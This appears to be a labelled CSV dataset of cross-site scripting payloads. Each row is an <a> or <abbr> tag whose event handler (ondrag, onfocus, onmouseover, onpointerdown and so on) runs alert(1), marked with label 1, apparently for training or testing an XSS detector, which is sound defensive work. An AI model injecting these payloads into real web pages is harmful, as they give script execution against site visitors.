,Sentence,Label
0,"<a draggable=""true"" ondrag=""alert(1)"">test</a>
",1
1,"<a draggable=""true"" ondragend=""alert(1)"">test</a>
",1
2,"<a draggable=""true"" ondragenter=""alert(1)"">test</a>
",1
3,"<a draggable=""true"" ondragleave=""alert(1)"">test</a>
",1
4,"<a draggable=""true"" ondragstart=""alert(1)"">test</a>
",1
5,"<a id=x tabindex=1 onactivate=alert(1)></a>
",1
6,"<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
",1
7,"<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
",1
8,"<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
",1
9,"<a id=x tabindex=1 onfocus=alert(1)></a>
",1
10,"<a id=x tabindex=1 onfocusin=alert(1)></a>
",1
11,"<a onbeforecopy=""alert(1)"" contenteditable>test</a>
",1
12,"<a onbeforecut=""alert(1)"" contenteditable>test</a>
",1
13,"<a onbeforepaste=""alert(1)"" contenteditable>test</a>
",1
14,"<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
",1
15,"<a onclick=""alert(1)"">test</a>
",1
16,"<a oncontextmenu=""alert(1)"">test</a>
",1
17,"<a oncopy=""alert(1)"" contenteditable>test</a>
",1
18,"<a oncut=""alert(1)"" contenteditable>test</a>
",1
19,"<a ondblclick=""alert(1)"">test</a>
",1
20,"<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
",1
21,"<a onkeydown=""alert(1)"" contenteditable>test</a>
",1
22,"<a onkeypress=""alert(1)"" contenteditable>test</a>
",1
23,"<a onkeyup=""alert(1)"" contenteditable>test</a>
",1
24,"<a onmousedown=""alert(1)"">test</a>
",1
25,"<a onmouseenter=""alert(1)"">test</a>
",1
26,"<a onmouseleave=""alert(1)"">test</a>
",1
27,"<a onmousemove=""alert(1)"">test</a>
",1
28,"<a onmouseout=""alert(1)"">test</a>
",1
29,"<a onmouseover=""alert(1)"">test</a>
",1
30,"<a onmouseup=""alert(1)"">test</a>
",1
31,"<a onpaste=""alert(1)"" contenteditable>test</a>
",1
32,"<a onpointerdown=alert(1)>XSS</a>
",1
33,"<a onpointerenter=alert(1)>XSS</a>
",1
34,"<a onpointerleave=alert(1)>XSS</a>
",1
35,"<a onpointermove=alert(1)>XSS</a>
",1
36,"<a onpointerout=alert(1)>XSS</a>
",1
37,"<a onpointerover=alert(1)>XSS</a>
",1
38,"<a onpointerup=alert(1)>XSS</a>
",1
39,"<abbr draggable=""true"" ondrag=""alert(1)"">test</abbr>
",1
40,"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>
",1
41,"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>
",1
42,"<abbr draggable=""true"" ondragleave=""alert(1)"">test</abbr>
",1
43,"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>
",1
44,"<abbr id=x tabindex=1 onactivate=alert(1)></abbr>
",1
45,"<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>
",1
46,"<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>
",1
47,"<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>
",1
48,"<abbr id=x tabindex=1 onfocus=alert(1)></abbr>
",1
49,"<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
",1
50,"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>
",1
51,"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>
",1
52,"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>
",1
53,"<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>
",1
54,"<abbr onclick=""alert(1)"">test</abbr>
",1
55,"<abbr oncontextmenu=""alert(1)"">test</abbr>
",1
56,"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>
",1
57,"<abbr oncut=""alert(1)"" contenteditable>test</abbr>
",1
58,"<abbr ondblclick=""alert(1)"">test</abbr>
",1
59,"<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>
",1
60,"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>
",1
61,"<abbr onkeypress=""alert(1)"" contenteditable>test</abbr>
",1
62,"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>
",1
63,"<abbr onmousedown=""alert(1)"">test</abbr>
",1
64,"<abbr onmouseenter=""alert(1)"">test</abbr>
",1
65,"<abbr onmouseleave=""alert(1)"">test</abbr>
",1
66,"<abbr onmousemove=""alert(1)"">test</abbr>
",1
67,"<abbr onmouseout=""alert(1)"">test</abbr>
",1
68,"<abbr onmouseover=""alert(1)"">test</abbr>
",1
69,"<abbr onmouseup=""alert(1)"">test</abbr>
",1
70,"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>
",1
71,"<abbr onpointerdown=alert(1)>XSS</abbr>
",1
72,"<abbr onpointerenter=alert(1)>XSS</abbr>
",1
73,"<abbr onpointerleave=alert(1)>XSS</abbr>
",1
74,"<abbr onpointermove=alert(1)>XSS</abbr>
",1
75,"<abbr onpointerout=alert(1)>XSS</abbr>
",1
